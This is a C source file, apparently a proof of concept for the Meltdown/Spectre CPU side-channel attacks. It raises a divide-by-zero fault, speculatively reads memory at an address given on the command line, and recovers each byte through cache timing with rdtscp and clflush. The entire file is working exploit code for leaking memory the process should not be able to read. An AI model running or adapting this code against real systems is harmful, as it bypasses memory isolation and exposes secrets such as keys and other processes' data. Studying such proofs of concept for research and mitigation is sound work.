/*
 * Meltdown / Spectre PoC using FPE
 * Inspired by spectre PoC from the original paper
 *
 * For more information see README.md
 *
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE"
 * If we meet some day, and you think this stuff is worth it, you can buy us 
 * a beer in return.
 * ---------------------------------------------------------------------------- 
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>

static inline uint64_t
rdtscp(void)
{
	uint32_t lo, hi;

	asm volatile("rdtscp" : "=a" (lo), "=d" (hi) :: "%rcx");

	return (((uint64_t)hi << 32) | lo);
}

static inline void
clflush(volatile void *x)
{
	asm volatile("clflush (%0)" :: "r" (x));
}

char test[] = "Ssssh! It's a secret!";

/* array to be used to inspect cache state */
volatile uint8_t array[4096 * 256];

int r[256];
static jmp_buf buf;

void
fpe(int x)
{
    uint64_t time1, delta, best = 0, best2 = 0;
    volatile char dummy;
    int i, k;

    /* we get here because of SIGFPE, we're going to investigate
     * cache state here. */
    for (i = 1 ; i < 256; i++) {
        time1 = rdtscp();
        dummy = array[i * 4096];
        delta = rdtscp() - time1;
        if (best == 0 || delta <= best) {
            best2 = best;
            k = i;
            best = delta;
        }
    }

    /* we have a special case, if best access 1..255 is not much faster
     * comparing to others, then we have 0x00 case
     */
    if (best * 2 > best2) {
        r[0]++;
    } else
        r[k]++;

    longjmp(buf, 1);
}

int
main(int argc, char **argv)
{
    int i,j,best,key;
    size_t len = 1;
    int probes = 4096;
    uint8_t *k;
    volatile uint8_t junk = 0;
    struct sigaction act;
    char dummy[256];

    if (argc < 2) {
        fprintf(stderr, "usage: %s address [len]\n", argv[0]);
        fprintf(stderr, "use: %s 0 for test run\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    sscanf(argv[1], "%p", (void **)&k);

    if (k == NULL) {
        k = (void *)test;
        len = strlen(test) + 1;
    }

    if (argc > 2)
        sscanf(argv[2], "%zu", &len);

    /* initialize array by accessing all pages */
    for (i = 0; i < 256; i++)
        junk &= array[i * 4096];

    act.sa_handler = fpe;
    act.sa_flags = SA_NODEFER;

    if (sigaction(SIGFPE, &act, NULL) != 0) {
        fprintf(stderr, "Sorry, can't handle SIGFPE");
        exit(EXIT_FAILURE);
    }

    while (len--) {
        memset(r, 0, sizeof(r));
        /* 10 probes were identified to work just OK */
        for (probes = 0; probes < 10; probes++) {
            /* flush cache for array table */
            for (i = 0; i < 256; i++)
                clflush(&array[i * 4096]);

            /* get hostname into CPU cache */
            gethostname(dummy, 256);

            /* MAGIC */
            if (!setjmp(buf)) {
                /* Here's the trick, we try to speculatively execute (2).
                 * (1) rises a FPE because of dividing by 0, so we'll try
                 * to inspect cache state in SIGFPE signal handler */
                j = ((int)k)/0; /* (1) */
                /*NOTREACHED*/
                /* consider how fun is that comment ;-) */
                junk = array[(*(k)) * 4096]; /* (2) */
            }
            /* END OF MAGIC */
        }

        /* check who's the winner */
        best = -1;
        for (i = 0; i < 256; i++) {
            if (r[i] > best) {
                key = i;
                best = r[i];
            }
        }

        k++;
        fputc(key, stdout);
        fflush(stdout);
    }

    return 0;
}
